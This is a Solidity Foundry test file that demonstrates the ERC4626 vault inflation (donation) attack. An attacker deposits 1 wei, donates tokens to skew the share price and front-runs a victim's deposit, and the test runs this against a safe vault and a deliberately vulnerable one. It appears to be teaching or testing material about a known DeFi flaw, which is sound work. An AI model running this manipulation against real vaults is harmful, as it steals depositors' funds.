///SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";

import {ERC4626} from "../lib/solmate/src/tokens/ERC4626.sol";
import {ERC20} from "../lib/solmate/src/tokens/ERC20.sol";
import {ERC20} from "../lib/solmate/src/tokens/ERC20.sol";

import {SafeERC4626} from "../src/SafeERC4626.sol";
import {VulnerableERC4626} from "../src/VulnerableERC4626.sol";


contract VaultTest is Test {

	ERC4626 safeVault;
	ERC4626 vulnerableVault;
	ERC20 underlyingAsset;

	address victim;
	address attacker;

	function setUp() public {
		safeVault = new SafeERC4626();
		vulnerableVault = new VulnerableERC4626();
		victim = makeAddr("victim");
		attacker = makeAddr("attacker");
	}

	function test_Inflation_Safe() public {
		ERC4626 vault = safeVault;
		underlyingAsset = vault.asset();
		uint256 victimBalance = 1e18;
		uint256 attackerBalance = 1 + 1e18;
		
		deal(address(underlyingAsset), victim, victimBalance);
		deal(address(underlyingAsset), attacker, attackerBalance);
		vm.prank(victim); underlyingAsset.approve(address(vault), type(uint256).max);
		vm.prank(attacker); underlyingAsset.approve(address(vault), type(uint256).max);
		
		//attacker deposit 1 wei to get 1 shares
		vm.prank(attacker); vault.deposit(1, attacker);
		attackerBalance = attackerBalance - 1;

		//then attacker donate 1e18 so that totalAssets in vault is 1 + 1e18
		vm.prank(attacker); underlyingAsset.transfer(address(vault), 1e18);

		//victim then deposit its balance
		vm.prank(victim); vault.deposit(victimBalance, victim);

		console.log("attacker shares: %e", vault.balanceOf(attacker));
		console.log("victim shares: %e", vault.balanceOf(victim));

		//finally, attacker withdraw its shares
		vm.prank(attacker); vault.redeem(1, attacker, attacker);
		vm.prank(victim); vault.redeem(1, victim, victim);
		console.log("attacker assets: %e", underlyingAsset.balanceOf(attacker));
		console.log("victim assets: %e", underlyingAsset.balanceOf(victim));
	}

	function test_Inflation_Vulnerable() public {
		ERC4626 vault = vulnerableVault;
		underlyingAsset = vault.asset();
		uint256 victimBalance = 1e18;
		uint256 attackerBalance = 1 + 1e18;
		
		deal(address(underlyingAsset), victim, victimBalance);
		deal(address(underlyingAsset), attacker, attackerBalance);
		vm.prank(victim); underlyingAsset.approve(address(vault), type(uint256).max);
		vm.prank(attacker); underlyingAsset.approve(address(vault), type(uint256).max);
		
		//attacker deposit 1 wei to get 1 shares
		vm.prank(attacker); vault.deposit(1, attacker);
		attackerBalance = attackerBalance - 1;

		//then attacker donate 1e18 so that totalAssets in vault is 1 + 1e18
		vm.prank(attacker); underlyingAsset.transfer(address(vault), 1e18);

		//victim then deposit its balance
		vm.prank(victim); vault.deposit(victimBalance, victim);

		console.log("attacker shares: %e", vault.balanceOf(attacker));
		console.log("victim shares: %e", vault.balanceOf(victim));

		//finally, attacker withdraw its shares
		vm.prank(attacker); vault.redeem(1, attacker, attacker);
		vm.prank(victim); vault.redeem(1, victim, victim);
		console.log("attacker assets: %e", underlyingAsset.balanceOf(attacker));
		console.log("victim assets: %e", underlyingAsset.balanceOf(victim));
	}

}